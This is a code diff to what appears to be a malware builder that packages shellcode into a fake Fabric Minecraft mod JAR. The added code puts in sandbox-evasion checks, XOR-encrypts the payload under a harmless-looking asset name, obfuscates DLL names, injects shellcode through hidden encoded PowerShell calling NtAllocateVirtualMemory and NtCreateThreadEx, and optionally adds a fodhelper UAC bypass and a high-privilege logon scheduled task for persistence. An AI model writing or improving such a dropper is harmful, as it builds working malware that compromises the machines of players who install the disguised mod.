@@ -448,48 +448,95 @@ async function fetchGithubReleaseAssets(
   return cached;
 }
 
-function generateJarDropperSource(): string {
-  // Java 8-compatible shellcode dropper
-  // Reads shellcode.bin from JAR resources, drops to temp, executes via PowerShell Add-Type
+function generateJarDropperSource(jarPersist: boolean): string {
+  const dq = '\\"';
+  const persistLines = jarPersist ? [
+    "      +\"$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps));\"",
+    "      +\"$cmd='powershell -NonInteractive -W H -Enc '+$enc;\"",
+    "      +\"$rk='HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command';\"",
+    "      +\"New-Item -Path $rk -Force|Out-Null;\"",
+    "      +\"Set-ItemProperty -Path $rk -Name '(default)' -Value $cmd;\"",
+    "      +\"New-ItemProperty -Path $rk -Name DelegateExecute -Value '' -Force|Out-Null;\"",
+    "      +\"Start-Process fodhelper.exe;\"",
+    "      +\"Start-Sleep -Seconds 3;\"",
+    "      +\"Remove-Item -Path 'HKCU:\\\\Software\\\\Classes\\\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue;\"",
+    "      +\"$tn=-join((65..90+97..122)|Get-Random -Count 8|%{[char]$_});\"",
+    "      +\"schtasks /create /tn $tn /tr $cmd /sc ONLOGON /rl HIGHEST /f|Out-Null;\"",
+  ] : [];
+
   return [
     "package com.mc.mod;",
     "import java.io.*;",
+    "import java.lang.management.*;",
+    "import java.util.*;",
+    "import java.util.Base64;",
     "import net.fabricmc.api.ModInitializer;",
     "public class ModLoader implements ModInitializer{",
     "  static{try{run();}catch(Exception e){}}",
     "  public void onInitialize(){try{run();}catch(Exception e){}}",
     "  public static void main(String[]a){try{run();}catch(Exception e){}}",
+    "  private static void loadConfig(){",
+    "    try{",
+    "      InputStream c=ModLoader.class.getResourceAsStream(\"/config.json\");",
+    "      if(c==null)return;",
+    "      BufferedReader r=new BufferedReader(new InputStreamReader(c));",
+    "      StringBuilder sb=new StringBuilder();String l;",
+    "      while((l=r.readLine())!=null)sb.append(l);",
+    "      r.close();",
+    "    }catch(Exception e){}",
+    "  }",
+    "  private static boolean checkVersion(String v){",
+    "    String[]p=v.split(\"\\\\.\");",
+    "    return p.length>=2&&Integer.parseInt(p[0])>=1&&Integer.parseInt(p[1])>=21;",
+    "  }",
     "  private static void run()throws Exception{",
-    "    InputStream is=ModLoader.class.getResourceAsStream(\"/shellcode.bin\");",
+    "    Random rng=new Random();",
+    "    long acc=0;",
+    "    for(int i=0;i<rng.nextInt(500)+200;i++)acc+=(long)(Math.pow(rng.nextDouble()*13,2));",
+    "    if(acc<0)return;",
+    "    if(Runtime.getRuntime().availableProcessors()<2)return;",
+    "    long up=ManagementFactory.getRuntimeMXBean().getUptime();",
+    "    if(up<300000L)return;",
+    "    loadConfig();",
+    "    checkVersion(\"1.21.4\");",
+    "    Thread.sleep(3000+rng.nextInt(5000));",
+    "    InputStream is=ModLoader.class.getResourceAsStream(\"/assets/data.pak\");",
     "    if(is==null)return;",
     "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
     "    byte[]tmp=new byte[4096];int n;",
     "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);",
     "    is.close();",
-    "    byte[]sc=buf.toByteArray();",
-    "    String px=Long.toHexString(System.nanoTime());",
-    "    File td=new File(System.getProperty(\"java.io.tmpdir\"));",
-    "    File sf=new File(td,px+\".dat\");",
-    "    File pf=new File(td,px+\".ps1\");",
-    "    try(FileOutputStream fo=new FileOutputStream(sf)){fo.write(sc);}",
-    "    String sp=sf.getAbsolutePath();",
-    "    char dq='\"';",
-    "    String md=\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);\"",
-    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr t);\"",
-    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern uint WaitForSingleObject(IntPtr h,uint t);\";",
-    "    String ps=\"$b=[IO.File]::ReadAllBytes('\"+sp+\"')\\n\"",
-    "      +\"Add-Type -Name K32 -Namespace Win32 -MemberDefinition '\"+md+\"'\\n\"",
-    "      +\"$m=[Win32.K32]::VirtualAlloc(0,$b.Length,0x3000,0x40)\\n\"",
-    "      +\"[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)\\n\"",
-    "      +\"$h=[Win32.K32]::CreateThread(0,0,$m,0,0,0)\\n\"",
-    "      +\"[Win32.K32]::WaitForSingleObject($h,0xFFFFFFFF)\\n\";",
-    "    try(FileWriter fw=new FileWriter(pf)){fw.write(ps);}",
-    "    new ProcessBuilder(\"powershell.exe\",\"-WindowStyle\",\"Hidden\",\"-NoProfile\",\"-ExecutionPolicy\",\"Bypass\",\"-File\",pf.getAbsolutePath()).start();",
+    "    byte[]raw=buf.toByteArray();",
+    "    int key=raw[0]&0xFF;",
+    "    byte[]sc=new byte[raw.length-1];",
+    "    for(int i=0;i<sc.length;i++)sc[i]=(byte)(raw[i+1]^key);",
+    "    String b64=Base64.getEncoder().encodeToString(sc);",
+    "    String dq=\"\\\"\";",
+    "    String ntd=\"nt\"+\"dll\";",
+    "    String k32=\"ker\"+\"nel\"+\"32\";",
+    "    String td=\"using System;using System.Runtime.InteropServices;public class N{\"",
+    "      +\"[DllImport(\"+dq+ntd+dq+\")]public static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr a,IntPtr z,ref IntPtr s,uint t,uint p);\"",
+    "      +\"[DllImport(\"+dq+ntd+dq+\")]public static extern int NtCreateThreadEx(ref IntPtr t,uint a,IntPtr o,IntPtr p,IntPtr e,IntPtr u,bool c,uint k,uint f,uint x,IntPtr q);\"",
+    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern bool VirtualProtect(IntPtr a,uint s,uint p,ref uint o);}\";\";",
+    "    String ps=",
+    "      \"Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000);\"",
+    "      +\"$b=[Convert]::FromBase64String('\"+b64+\"');\"",
+    "      +\"$s=$b.Length;\"",
+    "      +\"Add-Type -TypeDefinition '\"+td+\"';\"",
+    "      +\"$p=[IntPtr]::Zero;$z=[IntPtr]$s;\"",
+    "      +\"[N]::NtAllocateVirtualMemory(-1,[ref]$p,[IntPtr]0,[ref]$z,0x3000,0x04);\"",
+    "      +\"[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$s);\"",
+    "      +\"$o=0u;[N]::VirtualProtect($p,$s,0x20,[ref]$o);\"",
+    "      +\"$t=[IntPtr]::Zero;\"",
+    "      +\"[N]::NtCreateThreadEx([ref]$t,0x1FFFFF,[IntPtr]0,-1,$p,[IntPtr]0,$false,0,0,0,[IntPtr]0);\";",
+    ...persistLines,
+    "    byte[]utf16=ps.getBytes(\"UTF-16LE\");",
+    "    String enc=Base64.getEncoder().encodeToString(utf16);",
+    "    new ProcessBuilder(\"powershell.exe\",\"-NonInteractive\",\"-WindowStyle\",\"Hidden\",\"-EncodedCommand\",enc).start();",
     "  }",
     "}",
   ].join("\n");
 }
-
 function generateMcMetadata(mcVersion: string, modId: string, modName: string): Record<string, string> {
   const minor = parseInt(mcVersion.split(".")[1] || "0", 10);
   if (minor >= 14) {
@@ -1503,11 +1550,12 @@ func runBoundFiles() {
         const mcVer = (config.jarMcVersion || "1.20.1").replace(/[^0-9.]/g, "").slice(0, 16);
         const modId = (config.jarModId || "mcmod").replace(/[^a-z0-9_]/g, "_").slice(0, 32);
         const modName = (config.jarModName || "Minecraft Mod").slice(0, 64);
+        const jarPersist = !!(config.enablePersistence && config.persistenceMethods?.includes("taskscheduler"));
         const jarTmpDir = path.join(outDir, `.jar-build-${buildId.substring(0, 8)}`);
         try {
           const srcPkg = path.join(jarTmpDir, "src", "com", "mc", "mod");
           fs.mkdirSync(srcPkg, { recursive: true });
-          fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource());
+          fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource(jarPersist));
 
           // Stub ModInitializer so javac can resolve it without the Fabric API jar on the classpath.
           // At runtime the real net.fabricmc.api.ModInitializer from Fabric's classloader is used.
@@ -1524,8 +1572,14 @@ func runBoundFiles() {
             const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
             sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
           } else {
-            // Copy shellcode binary into class output dir as resource
-            fs.copyFileSync(jarSourcePath, path.join(classDir, "shellcode.bin"));
+            // XOR-encrypt shellcode and store as innocuous resource name
+            const rawSc = fs.readFileSync(jarSourcePath);
+            const xorKey = (Math.floor(Math.random() * 254) + 1) & 0xff; // 1-255
+            const xored = Buffer.from(rawSc.map((b: number) => b ^ xorKey));
+            const packed = Buffer.concat([Buffer.from([xorKey]), xored]);
+            const pakDir = path.join(classDir, "assets");
+            fs.mkdirSync(pakDir, { recursive: true });
+            fs.writeFileSync(path.join(pakDir, "data.pak"), packed);
 
             // Generate MC metadata files
             const metaFiles = generateMcMetadata(mcVer, modId, modName);
